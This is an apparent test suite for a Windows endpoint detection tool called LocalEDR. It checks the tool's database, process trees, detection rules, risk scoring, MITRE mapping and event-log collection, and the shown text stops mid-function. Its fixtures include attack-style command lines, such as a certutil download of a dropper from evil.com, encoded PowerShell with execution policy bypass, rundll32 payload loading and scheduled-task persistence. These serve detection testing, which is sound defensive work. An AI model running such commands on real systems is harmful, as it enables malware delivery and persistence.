import { loadConfig, getConfig } from '../backend/config/index.js';
import { logger } from '../backend/logger/index.js';
import { getVersionInfo } from '../backend/version/index.js';
import { initDatabase, checkDatabaseHealth, query, run } from '../backend/db/index.js';
import { performHealthCheck } from '../backend/health/index.js';
import { eventQueue } from '../backend/queue/index.js';

let passed = 0;
let failed = 0;

function assert(condition: boolean, testName: string) {
  if (condition) {
    console.log(`  \x1b[32m✔\x1b[0m ${testName}`);
    passed++;
  } else {
    console.error(`  \x1b[31m✖\x1b[0m ${testName}`);
    failed++;
  }
}

async function runTests() {
  console.log('\n\x1b[1m=== Running LocalEDR Foundation Tests ===\x1b[0m\n');

  // Test 1: Configuration System
  console.log('\x1b[36m[Test Suite: Configuration System]\x1b[0m');
  const config = loadConfig();
  assert(config !== null, 'Config loads successfully');
  assert(typeof config.server.port === 'number', 'Server port is a number');
  assert(config.agent.serviceName === 'LocalEDR_Agent', 'Agent service name defaults to LocalEDR_Agent');
  assert(config.database.filePath.includes('localedr.db'), 'Database path points to local SQLite file');
  assert(Array.isArray(config.server.corsAllowedOrigins), 'CORS origins are configured');

  // Test 2: Logging System
  console.log('\n\x1b[36m[Test Suite: Logging System]\x1b[0m');
  assert(typeof logger.info === 'function', 'Logger exposes info()');
  assert(typeof logger.error === 'function', 'Logger exposes error()');
  assert(typeof logger.audit === 'function', 'Logger exposes audit()');
  logger.info('Test log entry from test suite', { suite: 'unit-test' });
  logger.audit('CONFIG_CHECK', 'TEST_RUNNER', 'Verified logger functionality');
  assert(true, 'Logger writes without throwing exceptions');

  // Test 3: Version Information
  console.log('\n\x1b[36m[Test Suite: Version Information]\x1b[0m');
  const version = getVersionInfo();
  assert(version.name === 'LocalEDR', 'Version name is LocalEDR');
  assert(version.version.startsWith('1.'), 'Version is semantic version 1.x');
  assert(typeof version.runtime.platform === 'string', 'Runtime platform is reported');
  assert(typeof version.runtime.nodeVersion === 'string', 'Node runtime version is reported');

  // Test 4: SQLite Database Initialization & Health
  console.log('\n\x1b[36m[Test Suite: SQLite Database]\x1b[0m');
  await initDatabase();
  const dbHealth = checkDatabaseHealth();
  assert(dbHealth.healthy === true, 'Database health check reports healthy: true');
  assert(dbHealth.latencyMs >= 0, `Database latency measured (${dbHealth.latencyMs}ms)`);

  const tables = query<{ name: string }>("SELECT name FROM sqlite_master WHERE type='table'");
  const tableNames = tables.map(t => t.name);
  assert(tableNames.includes('events'), 'Database has events table');
  assert(tableNames.includes('rules'), 'Database has rules table');
  assert(tableNames.includes('alerts'), 'Database has alerts table');
  assert(tableNames.includes('threat_intel'), 'Database has threat_intel table');
  assert(tableNames.includes('response_actions'), 'Database has response_actions table');
  assert(tableNames.includes('audit_logs'), 'Database has audit_logs table');

  // Test 5: Local Event Queue
  console.log('\n\x1b[36m[Test Suite: Local Event Queue]\x1b[0m');
  const enqueued = eventQueue.enqueue({ test: true, time: Date.now() });
  assert(enqueued === true, 'Event successfully queued');
  const metrics = eventQueue.getMetrics();
  assert(metrics.totalEnqueued >= 1, 'Queue metrics count total enqueued');

  // Test 6: Health Check Mechanism
  console.log('\n\x1b[36m[Test Suite: Health-Check Mechanism]\x1b[0m');
  const health = performHealthCheck(eventQueue.length);
  assert(health.status === 'HEALTHY' || health.status === 'DEGRADED', 'Overall health check status evaluates');
  assert(health.subsystems.database.status === 'UP', 'Database subsystem reports UP');
  assert(health.subsystems.memory.rssMb > 0, `Memory footprint reported (${health.subsystems.memory.rssMb} MB)`);
  assert(health.subsystems.eventQueue.status === 'UP', 'Event queue subsystem reports UP');

  // Test 7: Windows Service Scripts & Resilience
  console.log('\n\x1b[36m[Test Suite: Windows Service Architecture & SCM Scripts]\x1b[0m');
  const rootDir = process.cwd();
  const requiredServiceScripts = [
    'install-service.ps1',
    'uninstall-service.ps1',
    'start-service.ps1',
    'stop-service.ps1',
    'restart-service.ps1',
    'status-service.ps1',
    'service-manager.bat'
  ];
  for (const s of requiredServiceScripts) {
    const fullPath = (await import('node:path')).default.resolve(rootDir, 'scripts', s);
    assert((await import('node:fs')).default.existsSync(fullPath), `Service script scripts/${s} exists`);
  }

  const installScriptContent = (await import('node:fs')).default.readFileSync((await import('node:path')).default.resolve(rootDir, 'scripts', 'install-service.ps1'), 'utf-8');
  assert(installScriptContent.includes('start= auto'), 'Install script configures automatic boot startup (SERVICE_AUTO_START)');
  assert(installScriptContent.includes('actions= restart/5000/restart/5000/restart/10000'), 'Install script configures automatic crash restart');

  // Test 8: Process Monitoring SQLite Schema & Indexes
  console.log('\n\x1b[36m[Test Suite: Process Monitoring Schema & Indexes]\x1b[0m');
  const { 
    recordProcessEvent, 
    recordProcessTermination,
    getProcesses, 
    getProcessByPid, 
    getProcessTree, 
    getProcessLineage,
    getProcessTreeStats,
    calculateProcessRisk,
    seedBaselineProcesses, 
    hashSignatureCache, 
    getOrComputeExecutableHash 
  } = await import('../backend/process/index.js');

  const procTables = query<{ name: string }>("SELECT name FROM sqlite_master WHERE type='table'");
  assert(procTables.map(t => t.name).includes('process_events'), 'Table process_events exists in SQLite');

  const procIndexes = query<{ name: string }>("SELECT name FROM sqlite_master WHERE type='index'").map(i => i.name);
  assert(procIndexes.includes('idx_process_events_pid'), 'Index idx_process_events_pid exists');
  assert(procIndexes.includes('idx_process_events_ppid'), 'Index idx_process_events_ppid exists');
  assert(procIndexes.includes('idx_process_events_name'), 'Index idx_process_events_name exists');
  assert(procIndexes.includes('idx_process_events_timestamp'), 'Index idx_process_events_timestamp exists');
  assert(procIndexes.includes('idx_process_events_sha256'), 'Index idx_process_events_sha256 exists');
  assert(procIndexes.includes('idx_process_events_exe'), 'Index idx_process_events_exe exists');

  // Test 9: Normal Windows Applications Baseline & Event Model
  console.log('\n\x1b[36m[Test Suite: Process Event Model & Windows Applications Baseline]\x1b[0m');
  seedBaselineProcesses();
  const baselineList = getProcesses({ limit: 2000 });
  assert(baselineList.total >= 10, `Baseline processes populated (${baselineList.total} total)`);

  const procNames = baselineList.processes.map(p => p.process_name.toLowerCase());
  assert(procNames.includes('system'), 'Contains System process');
  assert(procNames.includes('services.exe'), 'Contains services.exe');
  assert(procNames.includes('svchost.exe'), 'Contains svchost.exe');
  assert(procNames.includes('explorer.exe'), 'Contains explorer.exe');
  assert(procNames.includes('notepad.exe'), 'Contains notepad.exe');
  assert(procNames.includes('cmd.exe'), 'Contains cmd.exe');
  assert(procNames.includes('powershell.exe'), 'Contains powershell.exe');

  const explorerProc = baselineList.processes.find(p => p.process_name.toLowerCase() === 'explorer.exe');
  assert(explorerProc !== undefined, 'explorer.exe record found');
  if (explorerProc) {
    assert(explorerProc.pid === 1120, 'PID captured correctly (1120)');
    assert(explorerProc.parent_pid === 740, 'Parent PID captured correctly (740)');
    assert(explorerProc.executable_path.includes('explorer.exe'), 'Executable path is correct');
    assert(explorerProc.username.includes('User'), 'Username is correct');
    assert(explorerProc.integrity_level === 'Medium', 'Integrity level is Medium');
    assert(explorerProc.signature_status === 'Valid', 'Signature status is Valid');
    assert(explorerProc.publisher.includes('Microsoft'), 'Publisher is Microsoft Windows Publisher');
    assert(explorerProc.sha256.length === 64, 'SHA-256 hash length is 64 characters');
  }

  // Test 10: Filtering, PID Detail, & Hierarchical Tree
  console.log('\n\x1b[36m[Test Suite: Process Queries, PID Lookup & Execution Tree]\x1b[0m');
  const systemProcs = getProcesses({ integrity_level: 'System' });
  assert(systemProcs.processes.length > 0, `Filtered System integrity processes (${systemProcs.processes.length})`);
  assert(systemProcs.processes.every(p => p.integrity_level === 'System'), 'All filtered processes have System integrity');

  const pidDetail = getProcessByPid(1120);
  assert(pidDetail.process !== null, 'Found process by PID 1120');
  assert(pidDetail.children.length > 0, `explorer.exe has child processes (${pidDetail.children.length})`);

  const execTree = getProcessTree();
  assert(execTree.length > 0, `Process execution tree constructed with ${execTree.length} root branches`);
  assert(execTree.map(t => t.pid).includes(4), 'System PID 4 is a root node in tree');

  // Verify reconstructed relationship: explorer.exe -> chrome.exe, powershell.exe, cmd.exe
  const explorerNode = execTree.find(t => t.pid === 1120);
  assert(explorerNode !== undefined, 'explorer.exe (PID 1120) reconstructed as top-level branch');
  if (explorerNode) {
    const explorerChildren = explorerNode.children.map(c => c.process_name.toLowerCase());
    assert(explorerChildren.includes('chrome.exe'), 'Tree links chrome.exe under explorer.exe');
    assert(explorerChildren.includes('powershell.exe'), 'Tree links powershell.exe under explorer.exe');
    assert(explorerChildren.includes('cmd.exe'), 'Tree links cmd.exe under explorer.exe');
  }

  // Verify handling of terminated parent process: updater_setup.exe (5520) [Terminated] -> bg_sync_service.exe (5530)
  const updaterNode = explorerNode?.children.find(c => c.pid === 5520);
  assert(updaterNode !== undefined, 'Terminated parent updater_setup.exe retained in tree');
  assert(updaterNode?.is_terminated === true, 'updater_setup.exe marked as is_terminated: true');
  const bgService = updaterNode?.children.find(c => c.pid === 5530);
  assert(bgService !== undefined, 'Child bg_sync_service.exe remains attached beneath terminated parent');

  // Test 11: Process-Tree Lineage & Stats APIs
  console.log('\n\x1b[36m[Test Suite: Process Tree Lineage, Stats & Risk Scoring]\x1b[0m');
  const lineage = getProcessLineage(4912); // conhost.exe
  assert(lineage.target?.process_name === 'conhost.exe', 'Lineage finds target process conhost.exe');
  assert(lineage.ancestors.length >= 2, 'Lineage accurately reconstructs ancestor chain');

  const treeStats = getProcessTreeStats();
  assert(treeStats.totalProcesses >= 10, 'Tree stats calculates total process count');
  assert(treeStats.terminatedProcesses >= 1, 'Tree stats tracks terminated processes');

  const riskCalc = calculateProcessRisk({
    process_name: 'powershell.exe',
    command_line: 'powershell.exe -enc SQBFAFgA -ExecutionPolicy Bypass'
  });
  assert(riskCalc.risk_score >= 60, 'Calculates high risk for obfuscated PowerShell command');

  // Test 12: Real-time Event Ingestion & In-Memory Hash/Signature Caching
  console.log('\n\x1b[36m[Test Suite: Ingestion & Resource-Conserving Hash/Signature Cache]\x1b[0m');
  const newEvt = recordProcessEvent({
    pid: 9944,
    parent_pid: 1120,
    process_name: 'mspaint.exe',
    executable_path: 'C:\\Windows\\System32\\mspaint.exe',
    command_line: '"C:\\Windows\\System32\\mspaint.exe"',
    username: 'WIN-LAPTOP\\User',
    integrity_level: 'Medium',
    sha256: 'a1b2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef',
    signature_status: 'Valid',
    publisher: 'Microsoft Windows Publisher',
    source: 'unit_test'
  });
  assert(newEvt.id > 0, 'New process event recorded into SQLite');
  const fetchedPaint = getProcessByPid(9944);
  assert(fetchedPaint.process?.process_name === 'mspaint.exe', 'Fetched newly created process by PID 9944');

  const testCachePath = 'C:\\Windows\\System32\\cachedapp.exe';
  hashSignatureCache.set(testCachePath, {
    sha256: 'f00dbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678',
    signature_status: 'Valid',
    publisher: 'Example Publisher Corp'
  });
  const cachedHit = getOrComputeExecutableHash(testCachePath);
  assert(cachedHit.sha256 === 'f00dbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678', 'Cache hit returns cached SHA-256 without disk access');
  assert(cachedHit.publisher === 'Example Publisher Corp', 'Cache hit returns cached publisher');

  // Test 13: Real Detection Engine & Configurable Rules Evaluation
  console.log('\n\x1b[36m[Test Suite: Detection Engine Rule Catalog (YAML & JSON)]\x1b[0m');
  const { 
    syncDefaultRules, 
    getRules, 
    evaluateRuleConditions, 
    ingestAndDetect, 
    getAlerts, 
    getAlertById 
  } = await import('../backend/detection/index.js');

  syncDefaultRules();
  const detectionRules = getRules();
  assert(detectionRules.length >= 8, `Loaded ${detectionRules.length} rules from YAML & JSON catalogs`);

  for (const r of detectionRules) {
    assert(!!r.id && !!r.name && !!r.severity && r.score >= 0, `Rule ${r.id} has ID, name, severity, and score`);
    assert(!!r.mitre?.tactic && !!r.mitre?.technique_id, `Rule ${r.id} has MITRE tactic & technique ID`);
    assert(typeof r.conditions === 'object', `Rule ${r.id} has conditions`);
    assert(typeof r.recommended_action === 'string' && r.recommended_action.length > 0, `Rule ${r.id} has recommended action`);
  }

  console.log('\n\x1b[36m[Test Suite: Detection Engine Required Detections & Condition Types]\x1b[0m');

  // 1. PowerShell spawned by Microsoft Office
  const psOffice = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'powershell.exe',
    parent_process_name: 'winword.exe',
    parent_process_id: 6112,
    command_line: 'powershell.exe -enc V3JpdGUtSG9zdA==',
    user: 'WIN-LAPTOP\\User'
  });
  const psOfficeAlert = psOffice.alertsGenerated.find(a => a.rule_id === 'EDR-001-OFFICE-POWERSHELL');
  assert(psOfficeAlert !== undefined, 'Detections: PowerShell spawned by Microsoft Office (EDR-001)');
  assert(psOfficeAlert?.score !== undefined && psOfficeAlert.score >= 40 && psOfficeAlert.score <= 100, 'PowerShell Office alert score is calculated transparently');
  assert(psOfficeAlert?.risk_level !== undefined, 'PowerShell Office alert has risk level');
  assert(psOfficeAlert?.mitre_technique_id === 'T1059.001', 'PowerShell Office alert MITRE is T1059.001');

  // 2. cmd.exe spawned by an unusual parent (Chrome)
  const cmdBrowser = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'cmd.exe',
    parent_process_name: 'chrome.exe',
    parent_process_id: 2840,
    command_line: 'cmd.exe /c whoami',
    user: 'WIN-LAPTOP\\User'
  });
  const cmdBrowserAlert = cmdBrowser.alertsGenerated.find(a => a.rule_id === 'EDR-002-CMD-UNUSUAL-PARENT');
  assert(cmdBrowserAlert !== undefined, 'Detections: cmd.exe spawned by unusual parent (EDR-002)');
  assert(cmdBrowserAlert?.score !== undefined && cmdBrowserAlert.score > 0 && cmdBrowserAlert.score <= 100, 'cmd.exe unusual parent score is calculated');

  // 3. Executable launched from a temporary directory
  const tempExe = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'stage1.exe',
    parent_process_name: 'cmd.exe',
    image_path: 'C:\\Users\\User\\AppData\\Local\\Temp\\stage1.exe',
    command_line: '"C:\\Users\\User\\AppData\\Local\\Temp\\stage1.exe"',
    user: 'WIN-LAPTOP\\User'
  });
  const tempAlert = tempExe.alertsGenerated.find(a => a.rule_id === 'EDR-003-EXE-FROM-TEMP-DIR');
  assert(tempAlert !== undefined, 'Detections: Executable launched from temporary directory (EDR-003)');
  assert(tempAlert?.score !== undefined && tempAlert.score > 0 && tempAlert.score <= 100, 'Temp directory execution score is calculated');

  // 4. Suspicious LOLBin execution
  const lolbin = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'certutil.exe',
    parent_process_name: 'cmd.exe',
    command_line: 'certutil.exe -urlcache -split -f http://evil.com/dropper.exe dropper.exe',
    user: 'WIN-LAPTOP\\User'
  });
  const lolbinAlert = lolbin.alertsGenerated.find(a => a.rule_id === 'EDR-004-SUSPICIOUS-LOLBIN-EXEC');
  assert(lolbinAlert !== undefined, 'Detections: Suspicious LOLBin execution (EDR-004)');
  assert(lolbinAlert?.score !== undefined && lolbinAlert.score > 0 && lolbinAlert.score <= 100, 'LOLBin alert score is calculated');

  // 5. Unsigned executable with suspicious parent
  const unsignedExe = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'loader.exe',
    parent_process_name: 'powershell.exe',
    parent_process_id: 4820,
    signature_status: 'Unsigned',
    command_line: 'loader.exe',
    user: 'WIN-LAPTOP\\User'
  });
  const unsignedAlert = unsignedExe.alertsGenerated.find(a => a.rule_id === 'EDR-005-UNSIGNED-EXE-SUSPICIOUS-PARENT');
  assert(unsignedAlert !== undefined, 'Detections: Unsigned executable with suspicious parent (EDR-005)');
  assert(unsignedAlert?.score !== undefined && unsignedAlert.score > 0 && unsignedAlert.score <= 100, 'Unsigned executable score is calculated');

  // 6. Known malicious hash match
  const maliciousHash = 'c8914c8996fb92427ae41e4649b934ca495991b7852b855e3b0c44298fc1c1a3';
  run(
    'INSERT OR IGNORE INTO threat_intel (type, value, description, threat_actor, severity, confidence, added_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
    ['sha256', maliciousHash, 'Known Malicious Cobalt Strike Stager', 'APT29', 'CRITICAL', 99, new Date().toISOString()]
  );
  const hashProc = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'rundll32.exe',
    parent_process_name: 'cmd.exe',
    file_hash: maliciousHash,
    command_line: 'rundll32.exe payload.dll,Start',
    user: 'WIN-LAPTOP\\User'
  });
  const hashAlert = hashProc.alertsGenerated.find(a => a.rule_id === 'EDR-006-KNOWN-MALICIOUS-HASH');
  assert(hashAlert !== undefined, 'Detections: Known malicious hash IoC match (EDR-006)');
  assert(hashAlert?.score === 100, 'Malicious hash score is 100 (Clamped maximum)');
  assert(hashAlert?.risk_level === 'Critical', 'Malicious hash risk level is Critical');
  assert(hashAlert?.severity === 'CRITICAL', 'Malicious hash severity is CRITICAL');

  // 7. Username condition detection
  const guestShell = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'cmd.exe',
    parent_process_name: 'explorer.exe',
    command_line: 'cmd.exe',
    user: 'WIN-LAPTOP\\Guest'
  });
  const guestAlert = guestShell.alertsGenerated.find(a => a.rule_id === 'EDR-008-SUSPICIOUS-USERNAME-SHELL');
  assert(guestAlert !== undefined, 'Detections: Suspicious username condition match (EDR-008)');

  // 8. Benign activity evaluation: 0 alerts generated!
  console.log('\n\x1b[36m[Test Suite: False Positive Prevention & Alert Detail Verification]\x1b[0m');
  const benignProcess = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'notepad.exe',
    parent_process_name: 'explorer.exe',
    command_line: '"C:\\Windows\\System32\\notepad.exe" "C:\\Users\\User\\Desktop\\document.txt"',
    signature_status: 'Valid',
    user: 'WIN-LAPTOP\\User'
  });
  assert(benignProcess.alertsGenerated.length === 0, 'Benign activity creates ZERO alerts (No classification as malicious)');

  // 9. Alert explanation check: WHY, WHICH rule, WHICH evidence, MITRE mapping, Risk score
  assert(psOfficeAlert !== undefined && psOfficeAlert.why_triggered.includes('triggered because:'), 'Alert explains WHY it triggered');
  assert(psOfficeAlert !== undefined && psOfficeAlert.rule_id === 'EDR-001-OFFICE-POWERSHELL', 'Alert specifies WHICH rule triggered');
  const evObj = JSON.parse(psOfficeAlert!.evidence_json);
  assert(Array.isArray(evObj.matched_criteria) && evObj.matched_criteria.length > 0, 'Alert specifies WHICH evidence was used');
  assert(psOfficeAlert!.mitre_technique_id === 'T1059.001', 'Alert specifies MITRE mapping');
  assert(psOfficeAlert!.score > 0 && psOfficeAlert!.score <= 100, 'Alert specifies Risk score (<= 100)');
  assert(psOfficeAlert!.base_score !== undefined, 'Alert specifies Base score');
  assert(psOfficeAlert!.risk_level !== undefined, 'Alert specifies Risk level');

  // 10. SQLite storage & API endpoints check
  const alertsInDb = getAlerts();
  assert(alertsInDb.length >= 7, `Stored alerts persist in SQLite (found ${alertsInDb.length})`);
  const fetchedAlert = getAlertById(alertsInDb[0].id);
  assert(fetchedAlert !== null && fetchedAlert.alert.id === alertsInDb[0].id, 'Alert API lookup by ID works');

  // Test 14: Transparent Risk-Scoring Engine, Clamping & Thresholds
  console.log('\n\x1b[36m[Test Suite: Transparent Risk-Scoring Engine & Math Clamping]\x1b[0m');
  const { 
    calculateTransparentRiskScore, 
    getRiskLevel, 
    getScoringConfig, 
    updateScoringConfig, 
    resetScoringConfig 
  } = await import('../backend/scoring/index.js');

  // Risk levels: 0-19 Informational, 20-39 Low, 40-59 Medium, 60-79 High, 80-100 Critical
  assert(getRiskLevel(15) === 'Informational', 'Risk Level: 15 maps to Informational (0-19)');
  assert(getRiskLevel(25) === 'Low', 'Risk Level: 25 maps to Low (20-39)');
  assert(getRiskLevel(45) === 'Medium', 'Risk Level: 45 maps to Medium (40-59)');
  assert(getRiskLevel(65) === 'High', 'Risk Level: 65 maps to High (60-79)');
  assert(getRiskLevel(85) === 'Critical', 'Risk Level: 85 maps to Critical (80-100)');

  // Default factors verification
  const scoringConf = getScoringConfig();
  assert(scoringConf.factors.suspicious_parent_child === 15, 'Factor: Suspicious parent-child relationship (+15)');
  assert(scoringConf.factors.suspicious_command_line === 20, 'Factor: Suspicious command line (+20)');
  assert(scoringConf.factors.unsigned_executable === 10, 'Factor: Unsigned executable (+10)');
  assert(scoringConf.factors.known_malicious_hash === 50, 'Factor: Known malicious hash (+50)');
  assert(scoringConf.factors.suspicious_temporary_execution === 15, 'Factor: Suspicious temporary execution (+15)');
  assert(scoringConf.factors.persistence_activity === 30, 'Factor: Persistence activity (+30)');
  assert(scoringConf.factors.threat_intel_match === 40, 'Factor: Threat intelligence match (+40)');
  assert(scoringConf.factors.mitre_technique_detection === 15, 'Factor: MITRE technique detection (+15)');

  // Clamping test: Prevent score from exceeding 100!
  const overflowCalc = calculateTransparentRiskScore({
    event: {
      event_type: 'process_creation',
      process_name: 'severe_dropper.exe',
      image_path: 'C:\\Windows\\Temp\\severe_dropper.exe',
      signature_status: 'Unsigned',
      command_line: 'severe_dropper.exe -enc AAAA /download',
      registry_key: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Auto'
    },
    rule: {
      id: 'EDR-006-KNOWN-MALICIOUS-HASH',
      name: 'Cobalt Strike Dropper',
      description: 'Severe multi-vector threat',
      severity: 'CRITICAL',
      score: 100,
      enabled: true,
      mitre: {
        tactic: 'Persistence',
        technique_id: 'T1547.001',
        technique_name: 'Registry Run Keys'
      },
      conditions: {},
      recommended_action: 'Isolate host'
    },
    threatIntelMatched: true
  });

  assert(overflowCalc.raw_score > 100, `Raw score exceeds 100 (computed ${overflowCalc.raw_score})`);
  assert(overflowCalc.final_score === 100, `Final score strictly clamped to 100 (got ${overflowCalc.final_score})`);
  assert(overflowCalc.is_clamped === true, 'Calculation flag is_clamped is true');
  assert(overflowCalc.risk_level === 'Critical', 'Clamped score 100 evaluates to Critical risk');
  assert(typeof overflowCalc.breakdown === 'string' && overflowCalc.breakdown.length > 0, 'Calculation includes transparent breakdown formula');

  // Configurable scores verification
  updateScoringConfig({ base_score: 5, factors: { suspicious_command_line: 25 } });
  const customConf = getScoringConfig();
  assert(customConf.base_score === 5, 'Configurable scoring: base_score updated to 5');
  assert(customConf.factors.suspicious_command_line === 25, 'Configurable scoring: factor weight updated to 25');
  resetScoringConfig();
  assert(getScoringConfig().base_score === 0, 'Configurable scoring: reset restored base_score to 0');

  // Test 15: MITRE ATT&CK Versioned Data Layer, Windows Techniques & Navigator Export
  console.log('\n\x1b[36m[Test Suite: MITRE ATT&CK Versioned Layer & Windows Techniques]\x1b[0m');
  const { mitreService } = await import('../backend/mitre/index.js');
  const activeVer = mitreService.getActiveVersion();
  assert(activeVer === 'v15.1', `Active MITRE ATT&CK version is v15.1 (${activeVer})`);

  const versionsList = mitreService.getVersionList();
  assert(versionsList.length >= 2, `MITRE registry contains multiple versions (${versionsList.length})`);
  assert(versionsList.some(v => v.version === 'v15.1' && v.status === 'ACTIVE'), 'MITRE v15.1 active in registry');

  const requiredTechs = [
    'T1059',
    'T1059.001',
    'T1053.005',
    'T1547.001',
    'T1218',
    'T1105',
    'T1071',
    'T1562',
    'T1082'
  ];
  for (const tid of requiredTechs) {
    const tech = mitreService.getTechniqueById(tid);
    assert(tech !== null, `Technique ${tid} present in MITRE database`);
    assert(!!tech?.name && !!tech?.tactic, `Technique ${tid} has name and tactic`);
    if (tid.includes('.')) {
      assert(tech?.is_subtechnique === true, `Sub-technique ${tid} flagged as sub-technique`);
    }
  }

  const covStats = mitreService.getCoverageStats();
  assert(covStats.totalTactics === 14, 'Full Enterprise ATT&CK matrix has 14 tactics');
  assert(covStats.tacticsObservedCount > 0, `Observed tactics tracked (${covStats.tacticsObservedCount})`);
  assert(covStats.techniquesObservedCount > 0, `Observed techniques tracked (${covStats.techniquesObservedCount})`);
  assert(covStats.totalAlertsCount > 0, `Total alerts counted in MITRE coverage (${covStats.totalAlertsCount})`);
  assert(Array.isArray(covStats.timeline) && covStats.timeline.length > 0, `Timeline points available (${covStats.timeline.length})`);
  assert(Array.isArray(covStats.hostCoverage) && covStats.hostCoverage.length > 0, `Host coverage tracks endpoints (${covStats.hostCoverage.length})`);

  const navExport = mitreService.exportAttackNavigatorLayer();
  assert(navExport.domain === 'enterprise-attack', 'Navigator layer domain is enterprise-attack');
  assert(navExport.versions.layer === '4.5', 'Navigator layer version is 4.5');
  assert(Array.isArray(navExport.techniques) && navExport.techniques.length > 0, `Navigator layer exported ${navExport.techniques.length} techniques`);

  // Test 17: Windows Event Log Collection, Channels & Common Event Schema
  console.log('\n\x1b[36m[Test Suite: Windows Event Log Collection, Channels & Noise Filtering]\x1b[0m');
  const {
    DEFAULT_CHANNELS,
    getCollectorConfig,
    updateChannelConfig,
    shouldCollectEvent,
    normalizeEvent,
    eventCollector
  } = await import('../backend/events/index.js');

  // Verify prioritized channels
  const prioritizedChannels = [
    'Security',
    'System',
    'PowerShell',
    'Windows Defender',
    'Task Scheduler',
    'Service Control Manager'
  ];
  for (const chName of prioritizedChannels) {
    assert(chName in DEFAULT_CHANNELS, `Prioritized channel '${chName}' configured`);
    assert(DEFAULT_CHANNELS[chName].enabled === true, `Channel '${chName}' enabled by default`);
    assert(Array.isArray(DEFAULT_CHANNELS[chName].allowed_event_ids), `Channel '${chName}' has allowed event IDs`);
  }

  // Verify specific key event IDs
  assert(DEFAULT_CHANNELS['Security'].allowed_event_ids.includes(4624), 'Security channel collects successful logon (4624)');
  assert(DEFAULT_CHANNELS['Security'].allowed_event_ids.includes(4625), 'Security channel collects failed logon (4625)');
  assert(DEFAULT_CHANNELS['Security'].allowed_event_ids.includes(4720), 'Security channel collects account creation (4720)');
  assert(DEFAULT_CHANNELS['Security'].allowed_event_ids.includes(4672), 'Security channel collects privilege changes (4672)');
  assert(DEFAULT_CHANNELS['System'].allowed_event_ids.includes(7045), 'System channel collects service creation (7045)');
  assert(DEFAULT_CHANNELS['Task Scheduler'].allowed_event_ids.includes(106), 'Task Scheduler channel collects scheduled task activity (106)');
  assert(DEFAULT_CHANNELS['PowerShell'].allowed_event_ids.includes(4104), 'PowerShell channel collects ScriptBlock activity (4104)');
  assert(DEFAULT_CHANNELS['Windows Defender'].allowed_event_ids.includes(5001), 'Windows Defender channel collects real-time protection disabled (5001)');

  // Verify low-resource system noise filtering
  assert(!shouldCollectEvent('Security', 4624, 'NT AUTHORITY\\LOCAL SERVICE'), 'System noise filter drops high-volume LOCAL SERVICE logon');
  assert(!shouldCollectEvent('Security', 4624, 'DWM-1'), 'System noise filter drops DWM background logon');
  assert(shouldCollectEvent('Security', 4624, 'SecAdmin'), 'Legitimate user logon (SecAdmin) passes noise filter');
  assert(shouldCollectEvent('Security', 4720, 'Administrator'), 'Security-relevant account creation passes noise filter');

  // Verify channel configuration is updateable and persisted
  const updatedChan = updateChannelConfig('Task Scheduler', { max_batch_size: 120 });
  assert(updatedChan.max_batch_size === 120, 'Configurable event channel property updated');
  const restoredChan = updateChannelConfig('Task Scheduler', { max_batch_size: 80 });
  assert(restoredChan.max_batch_size === 80, 'Channel property restored');

  console.log('\n\x1b[36m[Test Suite: Common Event Schema & SQLite Normalization Store]\x1b[0m');

  // Verify schema normalizes across all 5 event categories
  const normProc = normalizeEvent({ event_type: 'process_creation', process_name: 'test.exe', process_id: 1234 });
  assert(normProc.event_category === 'process', 'Common Event Schema normalizes process event');

  const normNet = normalizeEvent({ event_type: 'network_connection', destination_ip: '198.51.100.1', destination_port: 443 });
  assert(normNet.event_category === 'network', 'Common Event Schema normalizes network event');

  const normFile = normalizeEvent({ event_type: 'file_modification', file_path: 'C:\\test.txt' });
  assert(normFile.event_category === 'file', 'Common Event Schema normalizes file event');

  const normReg = normalizeEvent({ event_type: 'registry_event', registry_key: 'HKLM\\Software' });
  assert(normReg.event_category === 'registry', 'Common Event Schema normalizes registry event');

  const normWin = normalizeEvent({ channel: 'Security', windows_event_id: 4720, target_user: 'new_user' });
  assert(normWin.event_category === 'windows_event', 'Common Event Schema normalizes Windows event');
  assert(normWin.action.includes('Created'), 'Windows Event 4720 normalized action describes user creation');

  // Store normalized event in SQLite and query back
  const storeRes = eventCollector.ingest({
    channel: 'Security',
    windows_event_id: 4624,
    user_name: 'SecAuditor',
    action: 'Audit Log Ingestion Test',
    timestamp: new Date().toISOString()
  });
  assert(storeRes.storedId !== undefined && storeRes.storedId > 0, 'Normalized event persisted into SQLite normalized_events table');

  const queryRes = eventCollector.queryEvents({ channel: 'Security', limit: 5 });
  assert(queryRes.total > 0, `Query normalized events returned records (${queryRes.total} total)`);
  assert(queryRes.events.length > 0, 'Fetched normalized event records from SQLite');

  // Verify collector metrics
  const colMetrics = eventCollector.getMetrics();
  assert(colMetrics.totalCollected > 0, 'Collector tracks total collected events');
  assert(colMetrics.totalNormalized > 0, 'Collector tracks total normalized events');
  assert(colMetrics.totalIngestedToDb > 0, 'Collector tracks SQLite database ingestion count');

  console.log('\n\x1b[36m[Test Suite: Multi-Schema Detection Processing (All 5 Categories)]\x1b[0m');

  // 1. Process Event detection
  const procDetection = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'schtasks.exe',
    command_line: 'schtasks.exe /create /tn "TestPersistence" /tr "calc.exe"',
    user: 'WIN-LAPTOP\\User'
  });
  assert(procDetection.alertsGenerated.some(a => a.rule_id === 'EDR-010-SCHEDULED-TASK-PERSISTENCE'), 'Detection Engine processes Process Events (EDR-010)');

  // 2. Windows Event: Unauthorized Account Creation (4720)
  const acctDetection = ingestAndDetect({
    channel: 'Security',
    windows_event_id: 4720,
    event_type: 'account_created',
    event_category: 'windows_event',
    target_user: 'shadow_admin',
    user_name: 'LocalAdmin'
  });
  const acctAlert = acctDetection.alertsGenerated.find(a => a.rule_id === 'EDR-017-WIN-USER-ACCOUNT-CREATED');
  assert(acctAlert !== undefined, 'Detection Engine processes Windows Events: Account Creation (4720 -> EDR-017)');
